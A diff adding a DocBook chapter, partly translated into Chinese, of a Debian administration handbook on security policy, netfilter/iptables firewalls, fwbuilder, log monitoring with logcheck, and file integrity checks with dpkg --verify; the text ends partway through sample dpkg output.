@@ -1,0 +1,2022 @@
+<?xml version='1.0' encoding='utf-8' ?>
+<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
+]>
+<chapter id="security">
+  <chapterinfo>
+    <mediaobject condition="pdf">
+      <imageobject>
+        <imagedata fileref="images/chap-security.png" scalefit="1" />
+      </imageobject>
+    </mediaobject>
+    <keywordset>
+      <keyword>防火墙</keyword>
+      <keyword>网络过滤</keyword>
+      <keyword>IDS/NIDS</keyword>
+    </keywordset>
+  </chapterinfo>
+  <title>安全</title>
+  <highlights>
+    <para>一个信息系统根据其使用环境的不同可能具有不同等级的重要性。某些情况下，对公司性命攸关。因此，必须保护其免受各种风险。评估这些风险，定义并执行保护措施总称为“安全过程”。</para>
+  </highlights>
+  <section id="sect.defining-security-policy">
+    <title>定义安全策略</title>
+
+    <sidebar>
+      <title><emphasis>注意</emphasis> 本章所涉及范围</title>
+
+      <para>安全是一个很广泛并且敏感的题目，很难在一个章节的课程中来明确全面地表述。此处只划定几个重点，介绍一些可以用于安全领域的工具和方法。更深层次的读物，作品，书籍比比皆是。一本很好的入门书籍是<citetitle>Linux 服务器安全</citetitle>（由 O'Reilly 出版）。</para>
+    </sidebar>
+
+    <para>“安全”是一个涵盖很宽泛的概念，工具和方法，没有哪个是万用的。在其中做出选择，需要确切的知道你的目标是什么。保护系统从回答几个问题开始。急匆匆的实施随机的工具会把安全风险转移到错误的方向。</para>
+
+    <para>因此，首要的事情是确定目标。从下面的问题开始，是逐渐确定目标的好方法：</para>
+    <itemizedlist>
+      <listitem>
+	<para><emphasis>什么</emphasis> 是要保护的？要保护计算机还是要保护数据，其策略是不同的。如果是后者，还要知道保护哪些数据。</para>
+      </listitem>
+      <listitem>
+	<para>我们试图<emphasis>防止</emphasis>什么？机密数据泄露？意外数据丢失？服务中断而导致的收入损失？</para>
+      </listitem>
+      <listitem>
+	<para>同样，试图防止<emphasis>谁</emphasis>？防范正常用户的输入和防止有预谋的攻击者，其安全措施是大不相同的。</para>
+      </listitem>
+    </itemizedlist>
+
+    <para>术语“风险”通常用来涉及这三个因素的综合：保护什么，防止发生什么，谁会让它发生。三个问题的答案就塑造了风险。针对这种风险模型，就可以构建安全策略，并通过具体行动实施策略。</para>
+
+    <sidebar>
+      <title><emphasis>注意</emphasis> 永久质疑</title>
+
+      <para>Bruce Schneier，是一个安全事务（不仅仅是计算机安全）方面的世界级专家，曾将安全最重要神秘的面纱概括为一句箴言：“安全是一个过程，而非产品”。需要保护的东西会随着时间而改变。威胁和对付潜在攻击者的方法也是如此。即使安全策略被完美的设计和实施，也不应该躺在功劳簿上。引入了新的风险组件，则必须引入相应的对策。</para>
+    </sidebar>
+
+    <para>额外的限制也值得考虑，它们可以限制可用策略的范围。我们想要在多大程度上保护一个系统？这个问题会对实施策略产生重大影响。答案常常仅仅以金钱成本来定义，但是也应该考虑其他因素，例如强加给系统用户的不便或者性能降低程度。</para>
+
+    <para>一旦风险成型，就可以考虑开始设计实际的风险策略了。</para>
+
+    <sidebar>
+      <title><emphasis>注意</emphasis> 极端策略</title>
+
+      <para>某些情况下，保护系统所要做的行动是极其简单的。</para>
+
+      <para>譬如，如果要保护的系统只是一个每天结束时加几个数据的二手电脑，那么不采取特殊措施来保护它也是合理的。系统本身的价值很低。而数据不储存在电脑上，数据的价值几乎没有。渗透到该系统的潜在攻击者只会得到一个笨拙的计算器。保护这样一个系统的成本很可能比破坏导致的成本还要大。</para>
+
+      <para>另一方面，我们想最充分的保护机密数据，超过其他任何考虑。这种情况，一种恰当的做法可能是完全焚毁这些数据（安全删除文件，将硬盘粉碎成位元，然后将这些位元溶解到酸中，等等）。如果有额外的需求，数据必须存储以便将来使用（虽然不是马上可用），同时要考虑成本因素，那么可以将这些数据存储在白金合金板上，再存到世界山脉下面的防弹沙坑里，每一个都保密并且有重兵把守…</para>
+
+      <para>虽然看起来有些极端，但是它们足以应对所定义的风险，因为它们是在考虑了要达到的目标和约束条件之后思考的结果。只要是出于理性的决断，没有哪个安全策略比另外的更不值得敬畏。</para>
+    </sidebar>
+
+    <para>多数情况下，信息系统可以分割成一致独立的子系统。每个子系统有自身的需求和限制，这样可以单独评估每个风险和设计安全策略。一个需要谨记的原则是简短明晰的周界要比漫长而曲折的前沿容易定义。网络结构也应相应设计：敏感服务应集中在少数几个机器上，而且这些机器只能通过极少数检查点访问；保护这些检查点要比隔离所有敏感机器与外部世界简单。在这些点上，网络过滤器（包括防火墙）的作用就显而易见了。过滤器可以用专门的硬件，但是更为简单和复杂的解决方案是使用软件防火墙，例如在 Linux 内核中集成的。</para>
+  </section>
+  <section id="sect.firewall-packet-filtering">
+    <title>防火墙或者包过滤</title>
+    <indexterm><primary>防火墙</primary></indexterm>
+    <indexterm><primary>包过滤</primary></indexterm>
+
+    <sidebar>
+      <title><emphasis>回到基础</emphasis> 防火墙</title>
+      <indexterm><primary>包</primary><secondary>IP</secondary></indexterm>
+
+      <para><emphasis>防火墙</emphasis>是计算机设备的一部分，该设备使用硬件和（或者）软件分拣流入和流出的网络数据包（源自或者源于局域网），并且只允许符合预定义条件的包通过。</para>
+    </sidebar>
+
+    <para>防火墙是一个过滤网关，并且只对要通过它的数据包有作用。因此，只有在防火墙是这些数据包的唯一路由器的时候才有效。</para>
+
+    <para>缺乏标准配置（之前“过程，而非产品”的格言）就缺少交钥匙解决方案。然而，有些工具使配置 <emphasis>netfilter</emphasis> 防火墙更加简单，使用图形显示过滤规则。<command>fwbuilder</command> 无疑是其中的佼佼者。</para>
+    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>
+
+    <sidebar>
+      <title><emphasis>特例</emphasis> 局部防火墙</title>
+
+      <para>防火墙可以应用在个别机器上（相对于整个网络而言），在这些情况中其角色是过滤或限制对一些服务的访问，或阻止用户有意或无意安装的流氓软件对外部的连接。</para>
+    </sidebar>
+
+    <para>The Linux kernel embeds the <emphasis>netfilter</emphasis>
+    firewall. It can be controlled from user space with the
+    <command>iptables</command> and <command>ip6tables</command> commands.
+    The difference between these two commands is that the former acts on
+    the IPv4 network, whereas the latter acts on IPv6. Since both network
+    protocol stacks will probably be around for many years, both tools
+    will need to be used in parallel.</para>
+    <indexterm><primary><command>iptables</command></primary></indexterm>
+    <indexterm><primary><command>ip6tables</command></primary></indexterm>
+    <section id="sect.netfilter">
+      <title>Netfilter 行为</title>
+
+      <para><emphasis>netfilter</emphasis> 使用四个截然不同的表存储规则，来规定对数据包的三种操作：</para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>filter</literal> 关注过滤规则（接受，拒绝或者忽略数据包）；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>nat</literal> concerns translation of source or
+	  destination addresses and ports of packages;</para>
+        </listitem>
+        <listitem>
+	  <para><literal>mangle</literal> 关注对 IP 数据包的其他变化（包含 ToS － <emphasis>服务类型</emphasis> －区段和选项）；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>raw</literal> 允许在到达追踪系统之前手动更改数据包。</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>每个表都包含称为<emphasis>链（chains）</emphasis>的规则列表。防火墙使用标准链处理预定义环境下的数据包。管理员可以创建其他链，该链只有在被标准链引用（直接或间接）时才会起作用。</para>
+      <indexterm><primary>链（chain）</primary></indexterm>
+      <indexterm><primary>过滤规则</primary></indexterm>
+
+      <para><literal>过滤</literal> 表有三个标准链：</para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>输入</literal>：关注目的地是防火墙自身的数据包；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>输出</literal>：关注防火墙发出的数据包；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>转发</literal>：关注通过防火墙的数据包（既不是源头也不是目的地）。</para>
+        </listitem>
+      </itemizedlist>
+
+      <para><literal>nat</literal> 表也有三个标准链：</para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>预先路由</literal>：一旦数据包到达就修改；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>后路由</literal>：在准备继续上路时修改数据包；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>输出</literal>：修改防火墙自身产生的数据包。</para>
+        </listitem>
+      </itemizedlist>
+
+      <figure id="figure.chaines-netfilter">
+        <title><emphasis>netfilter</emphasis> 中的链是如何被调用的</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <para>每个链是一个规则列表；每个规则是条件集合以及符合条件时要采取的行动。当处理数据包时，防火墙逐一扫描链；当碰到规则条件时，“跳（jumps）”到（因此在命令中使用 <literal>-j</literal> 选项）规定的行为并继续处理。大多数常用的行为都已经标准化，并有专门操作。使用标准操作会中断对链的处理过程，此时数据包的去向未知（除了下面提到的例外）：</para>
+
+      <sidebar>
+        <title><emphasis>回到基础</emphasis> ICMP</title>
+
+	<para>ICMP (<emphasis>Internet Control Message </emphasis>Protocol)
+	is the protocol used to transmit complementary information on
+	communications. It allows testing network connectivity with the
+	<command>ping</command> command (which sends an ICMP <emphasis>echo
+	request</emphasis> message, which the recipient is meant to answer
+	with an ICMP <emphasis>echo reply</emphasis> message). It signals a
+	firewall rejecting a packet, indicates an overflow in a receive
+	buffer, proposes a better route for the next packets in the
+	connection, and so on. This protocol is defined by several RFC
+	documents; the initial RFC777 and RFC792 were soon completed and
+        extended.
+        <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" />
+        <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" />
+        </para>
+
+	<para>接收缓冲区是一个小内存区域，用来存储已经从网络到达而内核还未来得及处理的数据。如果该区域满了，新的数据就不能被接收，ICMP 会发出错误信号，这样发送者会减缓传输速率（理想情况下，过段时间就会达到平衡）。</para>
+        <indexterm><primary>ICMP</primary></indexterm>
+        <indexterm><primary>互联网控制信息协议（Internet Control Message Protocol）</primary></indexterm>
+        <indexterm><primary>接收缓冲区</primary></indexterm>
+        <indexterm><primary>缓冲区</primary><secondary>接收缓冲区</secondary></indexterm>
+        <indexterm><primary><command>ping</command></primary></indexterm>
+
+	<para>注意，虽然 IPv4 在没有 ICMP 的情况下，仍然能工作；但是，ICMPv6 对于 IPv6 来说是必须的。因为它结合了一些，在 IPv4 的世界中，遍布 ICMPv4 功能，IGMP（<emphasis>Internet Group Membership Protocol</emphasis>）和 ARP（<emphasis>Address Resolution Protocol</emphasis>）。 ICMPv6 在 RFC4443 中定义。<ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
+      </sidebar>
+
+      <para></para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>接受（ACCEPT）</literal>：允许数据包继续往下走；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>拒绝（REJECT）</literal>：通过 ICMP 错误数据包拒绝（命令 <command>iptables</command> 的<literal>--reject-with <replaceable>type</replaceable></literal> 选项可以设定错误类型）；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>丢弃（DROP）</literal>：删除（忽略）数据包；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>记录（LOG）</literal>：记录（通过 <command>syslogd</command>）描述数据包的信息；注意该行为不会中断处理，并且会继续执行链中断的下一条规则，这就为什么记录拒绝数据包既需要记录规则，也需要拒绝／丢弃规则；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>ULOG</literal>：通过 <command>ulogd</command> 记录信息，在处理大量信息时，它比 <command>syslogd</command> 更合适有效；注意该规则，类似 LOG，也会返回到调用链的下一条规则；</para>
+        </listitem>
+        <listitem>
+	  <para><replaceable>链名（chain_name）</replaceable>：跳转到指定链并处理其规则；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>返回</literal>：中断当前链的处理过程，并返回调用链；如果当前链是一个标准链，并且没有调用链，默认（有<command>iptables</command>中 <literal>-P</literal> 定义）就会执行该链；</para>
+        </listitem>
+        <listitem>
+	  <para><literal>SNAT</literal> (only in the
+	  <literal>nat</literal> table): apply
+	  <emphasis>Source NAT</emphasis> (extra options describe the
+	  exact changes to apply);</para>
+        </listitem>
+        <listitem>
+	  <para><literal>DNAT</literal> (only in the
+	  <literal>nat</literal> table): apply
+	  <emphasis>Destination NAT</emphasis> (extra options describe
+	  the exact changes to apply);</para>
+        </listitem>
+        <listitem>
+	  <para><literal>MASQUERADE</literal> (only in the
+	  <literal>nat</literal> table): apply
+	  <emphasis>masquerading</emphasis> (a special case of
+	  <emphasis>Source NAT</emphasis>);</para>
+        </listitem>
+        <listitem>
+	  <para><literal>REDIRECT</literal> (only in the
+	  <literal>nat</literal> table): redirect a
+	  packet to a given port of the firewall itself; this can be
+	  used to set up a transparent web proxy that works with no
+	  configuration on the client side, since the client thinks it
+	  connects to the recipient whereas the communications
+	  actually go through the proxy.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>其他规则，特别是和 <literal>mangle</literal> 表相关的，不在本章的范围。 <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> 和 <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> 有全面的清单介绍。</para>
+    </section>
+    <section id="sect.iptables">
+      <title><command>iptables</command> 和 <command>ip6tables</command>语法</title>
+
+      <para><command>iptables</command> 和 <command>ip6tables</command> 命令允许操作表格，链和规则。<literal>-t <replaceable>table</replaceable></literal> 选项指明要操作哪个表（默认，<literal>filter</literal>）。</para>
+      <indexterm><primary><command>iptables</command></primary></indexterm>
+      <indexterm><primary><command>ip6tables</command></primary></indexterm>
+      <section id="sect.iptables-command">
+        <title>命令</title>
+
+	<para>The <literal>-N
+	<replaceable>chain</replaceable></literal> option creates a
+	new chain. The <literal>-X
+	<replaceable>chain</replaceable></literal> deletes an empty
+	and unused chain. The <literal>-A
+	<replaceable>chain</replaceable>
+	<replaceable>rule</replaceable></literal> adds a rule at the
+	end of the given chain. The <literal>-I
+	<replaceable>chain</replaceable>
+	<replaceable>rule_num</replaceable>
+	<replaceable>rule</replaceable></literal> option inserts a
+	rule before the rule number
+	<replaceable>rule_num</replaceable>. The <literal>-D
+	<replaceable>chain</replaceable>
+	<replaceable>rule_num</replaceable></literal> (or <literal>-D
+	<replaceable>chain</replaceable>
+	<replaceable>rule</replaceable></literal>) option deletes a
+	rule in a chain; the first syntax identifies the rule to be
+	deleted by its number, while the latter identifies it by its
+	contents. The <literal>-F
+	<replaceable>chain</replaceable></literal> option flushes a
+	chain (deletes all its rules); if no chain is mentioned, all
+	the rules in the table are deleted. The <literal>-L
+	<replaceable>chain</replaceable></literal> option lists the
+	rules in the chain. Finally, the <literal>-P
+	<replaceable>chain</replaceable>
+	<replaceable>action</replaceable></literal> option defines the
+	default action, or “policy”, for a given chain; note that only
+	standard chains can have such a policy.</para>
+      </section>
+      <section id="sect.iptables-rules">
+        <title>规则</title>
+        <indexterm><primary>过滤规则</primary></indexterm>
+
+	<para>Each rule is expressed as
+	<literal><replaceable>conditions</replaceable> -j
+	<replaceable>action</replaceable>
+	<replaceable>action_options</replaceable></literal>.  If
+	several conditions are described in the same rule, then the
+	criterion is the conjunction (logical
+	<emphasis>and</emphasis>) of the conditions, which is at least
+	as restrictive as each individual condition.</para>
+
+	<para><literal>-p <replaceable>protocol</replaceable></literal> 条件匹配 IP 数据包的协议区段。最常见的是 <literal>tcp</literal>，<literal>udp</literal>，<literal>icmp</literal>，和 <literal>icmpv6</literal>。条件之前加上感叹号表示求反，就变成了“除了指定协议之外的任何数据包”。这种求反机制不仅仅适用于 <literal>-p</literal> 选项，也可用于其它所有条件。</para>
+
+	<para><literal>-s <replaceable>address</replaceable></literal> 或 <literal>-s <replaceable>network/mask</replaceable></literal> 条件匹配数据包的源地址。相应地，<literal>-d <replaceable>address</replaceable></literal> 或 <literal>-d <replaceable>network/mask</replaceable></literal> 匹配目的地地址。</para>
+
+	<para><literal>-i <replaceable>interface</replaceable></literal> 条件选择源自指定网络接口的数据包。<literal>-o <replaceable>interface</replaceable></literal> 条件选择从指定接口出去的数据包。</para>
+
+	<para>根据上述的通用条件，可以定义更具体的条件。例如，<literal>-p tcp</literal> 条件可以和 TCP 端口条件互为补充，就形成例如<literal>--source-port <replaceable>port</replaceable></literal> 和 <literal>--destination-port <replaceable>port</replaceable></literal>。</para>
+
+	<para><literal>--state <replaceable>state</replaceable></literal> 条件匹配连接中某个状态的数据包（这需要 <command>ipt_conntrack</command> 内核模块，用于连接追踪）。<literal>新（NEW）</literal> 状态指明开启新连接的数据包；<literal>建立（ESTABLISHED）</literal> 匹配属于已存在连接的数据包；<literal>相关（RELATED）</literal> 匹配发起与已存在连接相关的数据包（这对处于“活动”模式的 <literal>ftp-data</literal> 连接是很有用的）。</para>
+
+	<para>前面的段落列出了可用的操作，但是没有相应的选项。例如：<literal>记录 LOG</literal> 操作，有如下的选项：</para>
+        <itemizedlist>
+          <listitem>
+	    <para><literal>--log-level</literal>, with default value
+	    <literal>warning</literal>, indicates the
+	    <command>syslog</command> severity level;</para>
+          </listitem>
+          <listitem>
+	    <para><literal>--log-prefix</literal> 可用来指定不同文字前缀来区分消息；</para>
+          </listitem>
+          <listitem>
+	    <para><literal>--log-tcp-sequence</literal>，<literal>--log-tcp-options</literal> 和 <literal>--log-ip-options</literal> 指定需附加的消息数据：相对应的 TCP 序列号码，TCP 选项，和 IP 选项。</para>
+          </listitem>
+        </itemizedlist>
+
+	<para>The <literal>DNAT</literal> action 
+	provides the <literal>--to-destination
+	<replaceable>address</replaceable>:<replaceable>port</replaceable></literal>
+	option to indicate the new destination IP address and/or port.
+	Similarly, <literal>SNAT</literal> provides <literal>--to-source
+	<replaceable>address</replaceable>:<replaceable>port</replaceable></literal>
+	to indicate the new source IP address and/or port.</para>
+
+	<para>The <literal>REDIRECT</literal> action (only available
+	if NAT is available) provides the <literal>--to-ports
+	<replaceable>port(s)</replaceable></literal> option to
+	indicate the port, or port range, where the packets should be
+	redirected.</para>
+      </section>
+    </section>
+    <section id="sect.creating-rules">
+      <title>创建规则</title>
+
+      <para>每次创建规则需要使用 <command>iptables</command>/<command>ip6tables</command>命令。手工输入这些命令是繁琐的，可以将调用存储在脚本中，这样机器每次启动后就可以进行同样的自动配置。脚本可以手工输入，但是也可以使用很有趣的高级工具（例如，<command>fwbuilder</command>）来准备。</para>
+
+      
+      <screen>
+<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput>
+</screen>
+
+      <para>规则很简单。第一步，列出所有要调用的规则元素：</para>
+      <itemizedlist>
+        <listitem>
+	  <para>防火墙自身以及网络接口；</para>
+        </listitem>
+        <listitem>
+	  <para>网络，及其相应的 IP 范围；</para>
+        </listitem>
+        <listitem>
+	  <para>服务器；</para>
+        </listitem>
+        <listitem>
+	  <para>宿主服务器上服务所使用的端口号。</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>然后可以使用对象拖拽（drag-and-drop）来创建规则。一些上下文菜单可以改变条件（例如，求反）。然后选择操作和配置。</para>
+
+      <para>至于 IPv6，可以为 IPv4 和 IPv6 分别创建规则集，或者只创建一个并使用 <command>fwbuilder</command> 来根据赋给对象的地址来转化规则。</para>
+
+      <figure id="figure.fwbuilder">
+        <title>Fwbuilder 主窗口</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+      <indexterm><primary><command>fwbuilder</command></primary></indexterm>
+
+      <para><command>fwbuilder</command> can then generate a script
+      configuring the firewall according to the rules that have been
+      defined. Its modular architecture gives it the ability to generate
+      scripts targeting different systems (<command>iptables</command> for
+      Linux, <command>ipf</command> for FreeBSD and
+      <command>pf</command> for OpenBSD).</para>
+
+    </section>
+    <section id="sect.install-rules-at-boot">
+      <title>每次启动时加载规则</title>
+
+      <para>其他情况下，推荐的方法是将配置脚本在 <literal>up</literal> 目录下作为 <filename>/etc/network/interfaces</filename> 文件。在后面的例子中，脚本存储在  <filename>/usr/local/etc/arrakis.fw</filename>。</para>
+
+      <example id="example.network-interfaces-firewall">
+        <title><filename>接口（interfaces）</filename> 文件调用防火墙脚本</title>
+
+        <programlisting>auto eth0
+iface eth0 inet static
+    address 192.168.0.1
+    network 192.168.0.0
+    netmask 255.255.255.0
+    broadcast 192.168.0.255
+    up /usr/local/etc/arrakis.fw
+</programlisting>
+      </example>
+      <para>This obviously assumes that you are using <emphasis role="pkg">ifupdown</emphasis> to configure the network
+        interfaces. If you are using something else (like
+        <emphasis>NetworkManager</emphasis> or
+        <emphasis>systemd-networkd</emphasis>), then refer to their
+        respective documentation to find out ways to execute a script
+        after the interface has been brought up.
+      </para>
+
+    </section>
+  </section>
+  <section id="sect.supervision">
+    <title>监督：预防，检测，威慑</title>
+    <indexterm><primary>监视</primary></indexterm>
+
+    <para>Monitoring is an integral part of any security policy for several
+    reasons. Among them, that the goal of security is usually not
+    restricted to guaranteeing data confidentiality, but it also includes
+    ensuring availability of the services. It is therefore imperative to
+    check that everything works as expected, and to detect in a timely
+    manner any deviant behavior or change in quality of the service(s)
+    rendered. Monitoring activity can help detecting intrusion
+    attempts and enable a swift reaction before they cause grave
+    consequences. This section reviews some tools that can be used to
+    monitor several aspects of a Debian system. As such, it completes
+    <xref linkend="sect.monitoring" />.</para>
+    <section id="sect.logcheck">
+      <title>使用 <command>logcheck</command> 监视日志</title>
+      <indexterm><primary><command>logcheck</command>命令</primary></indexterm>
+      <indexterm><primary>日志</primary><secondary>监视</secondary></indexterm>
+      <indexterm><primary>监视</primary><secondary>日志文件</secondary></indexterm>
+
+      <para><command>logcheck</command> 程序默认每小时监视日志文件。它会把异常日志信息通过邮件发给管理员分析。</para>
+
+      <para>The list of monitored files is stored in
+      <filename>/etc/logcheck/logcheck.logfiles</filename>; the default
+      values work fine if the <filename>/etc/rsyslog.conf</filename> file
+      has not been completely overhauled.</para>
+
+      <para><command>logcheck</command> 可以以三种模式中的一种或几种工作：<emphasis>偏执（paranoid）</emphasis>, <emphasis>服务器（server）</emphasis> 和 <emphasis>工作站（workstation）</emphasis>。第一种模式是<emphasis>非常</emphasis>详细的，应该只限于特殊服务器，例如防火墙。推荐大多数服务器使用第二个（也是默认）模式。最后一个用于工作站，更简明（过滤掉了更多信息）。</para>
+
+      <para>在三种情况下，<command>logcheck</command> 可以被定制以排除某些信息（取决于安装的服务），除非管理员真想每小时收到一批不感兴趣的邮件。由于信息筛选机制相当复杂，如果碰到问题就需要翻阅 <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename>。</para>
+
+      <para>适用的规则可以分成几种类型：</para>
+      <itemizedlist>
+        <listitem>
+	  <para>被认为是尝试侵入的信息（文件存储在 <filename>/etc/logcheck/cracking.d/</filename> 目录中）；</para>
+        </listitem>
+        <listitem>
+	  <para>取消限制的信息（<filename>/etc/logcheck/cracking.ignore.d/</filename>）；</para>
+        </listitem>
+        <listitem>
+	  <para>被标识为安全警报的信息（<filename>/etc/logcheck/violations.d/</filename>）；</para>
+        </listitem>
+        <listitem>
+	  <para>取消此类标识的信息（<filename>/etc/logcheck/violations.ignore.d/</filename>）；</para>
+        </listitem>
+        <listitem>
+	  <para>最后是，剩余的信息（可以考虑为<emphasis>系统事件</emphasis>）。</para>
+        </listitem>
+      </itemizedlist>
+
+      <sidebar>
+        <title><emphasis>注意</emphasis>忽略信息</title>
+
+	<para>任何被标识为侵入尝试和安全警报的信息（按照 <filename>/etc/logcheck/violations.d/myfile</filename> 文件中的规则）只能由 <filename>/etc/logcheck/violations.ignore.d/myfile</filename> 或者 <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> 文件中定义的规则忽略。</para>
+      </sidebar>
+
+      <para>系统事件总是会被发送，除非在 <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> 目录中的规则指明某些事件要被忽略。当然，只有相应详细等级等于或大于所选择模式的目录会起作用。</para>
+    </section>
+    <section id="sect.monitoring-activity">
+      <title>监视行为</title>
+      <indexterm><primary>监视</primary><secondary>行为</secondary></indexterm>
+      <indexterm><primary>行为，监视</primary></indexterm>
+      <section id="sect.real-time-monitoring">
+        <title>实时</title>
+
+	<para><command>top</command> 是一个可以显示目前正在运行进程的交互工具。默认排序基于处理器的使用量，可以通过 <keycap>P</keycap> 键获取。其他排序方法包括内存使用量（<keycap>M</keycap> 键），总处理器时间（<keycap>T</keycap> 键）和处理器标识（<keycap>N</keycap> 键）。<keycap>k</keycap> 键允许输入进程标识结束进程。<keycap>r</keycap> 键可以 <emphasis>renicing</emphasis> 进程，例如改变优先级。</para>
+        <indexterm><primary><command>top</command></primary></indexterm>
+
+	<para>当系统过载时，<command>top</command> 是一个很好的工具，用来查看哪个进程抢占处理器或者消耗过多内存。特别是，检查那些进程所消耗的资源是宿主机器服务要使用的。以互联网数据用户身份运行的未知进程应该单列并调查，它很有可能是通过网络应用上的漏洞，在系统上安装并运行的软件。</para>
+
+	<para><command>top</command> 是一个很灵活的工具，手册页中详列了如何定制显示并让其适于个人需求和习惯。</para>
+
+        <para>The <command>gnome-system-monitor</command> graphical tool
+        is similar to <command>top</command> and it provides roughly the same
+	features.</para>
+
+        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
+      </section>
+      <section id="sect.monitoring-history">
+        <title>历史</title>
+        <indexterm><primary>活动，历史</primary></indexterm>
+
+	<para>处理器负载，网络流量和空闲磁盘空间是一直在变化的信息。记录它们的演变常常可以用来确定电脑是如何使用的。</para>
+        <indexterm><primary>SNMP</primary></indexterm>
+        <indexterm><primary>简单网络管理协议</primary></indexterm>
+
+	<para>有很多专门工具可用于此类任务。很多可以通过 SNMP（<emphasis>简单网络管理协议</emphasis>）获取数据，集中信息。这样的好处之一是可以从非通用计算机，例如专用的网络路由器或者交换机上获取数据。</para>
+
+	<para>This book deals with Munin in some detail (see <xref linkend="sect.munin" />) as part of <xref linkend="advanced-administration" xrefstyle="select: label  quotedtitle" />. Debian also provides a similar tool, <emphasis role="pkg">cacti</emphasis>. Its deployment is slightly more
+	complex, since it is based solely on SNMP. Despite having a web
+	interface, grasping the concepts involved in configuration still
+	requires some effort. Reading the HTML documentation
+	(<filename>/usr/share/doc/cacti/html/index.html</filename>) should
+	be considered a prerequisite.</para>
+
+        <sidebar>
+          <title><emphasis>选择</emphasis> <command>mrtg</command></title>
+          <indexterm><primary><command>mrtg</command></primary></indexterm>
+
+	  <para><command>mrtg</command>（在相似名称的软件包在）是一个较老的工具。尽管有些不足，但是它可以收集历史数据并以图形显示。它包含了一系列脚本用于收集最常用的监视数据，例如：处理器负载，网络流量，网页点击量，等等。</para>
+
+	  <para><emphasis role="pkg">mrtg-contrib</emphasis> 和 <emphasis role="pkg">mrtgutils</emphasis> 软件包含有可以直接使用的示例脚本。</para>
+        </sidebar>
+      </section>
+    </section>
+    <section>
+      <title>侦测变化</title>
+
+      <para>系统一旦安装和配置，除非安全更新，通常没有理由改变大部分文件和目录，数据除外。因此，要注意确保文件没有改变：任何非预期的变化都值得探究。本节介绍几个可以在非预期变化发生时监视文件并警告管理员（或者只列出变化）的工具。</para>
+      <section id="sect.dpkg-verify">
+        <title>Auditing Packages with <command>dpkg --verify</command></title>
+        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
+        <sidebar>
+          <title><emphasis>进阶</emphasis> 防止上游变化</title>
+
+	  <para><command>dpkg --verify</command> is useful in detecting changes
+	  to files coming from a Debian package, but it will be useless if
+	  the package itself is compromised, for instance if the Debian
+	  mirror is compromised. Protecting against this class of attacks
+	  involves using APT's digital signature verification system (see
+	  <xref linkend="sect.package-authentication" />), and taking care
+	  to only install packages from a certified origin.</para>
+        </sidebar>
+
+        <para><command>dpkg --verify</command> (or <command>dpkg
+            -V</command>) is an interesting tool since it allows finding
+          what installed files have been modified (potentially by an
+          attacker), but this should be taken with a grain of salt.  To do
+          its job it relies on checksums stored in dpkg's own database
+          which is stored on the hard disk (they can be found in
+          <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>);
+          a thorough attacker will therefore update these files so they
+          contain the new checksums for the subverted files.
+        </para>
+
+        <sidebar>
+          <title><emphasis>BACK TO BASICS</emphasis> File fingerprint</title>
+	  <indexterm><primary>fingerprint</primary></indexterm>
+	  <indexterm><primary>control sum</primary></indexterm>
+	  <indexterm><primary>MD5</primary></indexterm>
+	  <indexterm><primary>SHA1</primary></indexterm> 
+          <para>As a reminder: a
+          fingerprint is a value, often a number (even though in hexadecimal
+          notation), that contains a kind of signature for the contents of a
+          file. This signature is calculated with an algorithm (MD5 or SHA1
+          being well-known examples) that more or less guarantee that even
+          the tiniest change in the file contents implies a change in the
+          fingerprint; this is known as the “avalanche effect”. This
+          allows a simple numerical fingerprint to serve as a litmus test to
+          check whether the contents of a file have been altered. These
+          algorithms are not reversible; in other words, for most of them,
+          knowing a fingerprint doesn't allow finding the corresponding
+          contents. Recent mathematical advances seem to weaken the
+          absoluteness of these principles, but their use is not called into
+          question so far, since creating different contents yielding the
+          same fingerprint still seems to be quite a difficult task.
+          </para>
+        </sidebar>
+
+        <para>Running <command>dpkg -V</command> will verify all installed
+          packages and will print out a line for each file with a failing
+          test. The output format is the same as the one of <command>rpm
+            -V</command> where each character denotes a test on some
+          specific meta-data. Unfortunately <command>dpkg</command> does
+          not store the meta-data needed for most tests and will thus
+          output question marks for them. Currently only the checksum test
+          can yield a "5" on the third character (when it fails).
+        </para>
+        <screen>
+<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
+<computeroutput>??5??????   /lib/systemd/system/ssh.service
+??5?????? c /etc/libvirt/qemu/networks/default.xml
+??5?????? c /etc/lvm/lvm.conf
